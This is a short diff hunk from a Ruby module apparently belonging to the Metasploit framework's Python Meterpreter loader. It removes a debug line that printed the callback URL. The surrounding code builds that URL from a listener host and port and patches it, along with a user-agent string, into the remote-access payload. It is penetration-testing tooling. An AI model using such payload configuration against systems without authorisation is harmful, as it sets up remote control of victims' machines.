@@ -119,8 +119,6 @@ module Payload::Python::MeterpreterLoader
 
       callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
 
-      $stderr.puts callback_url
-
       # patch in the various payload related configuration
       met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
       met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
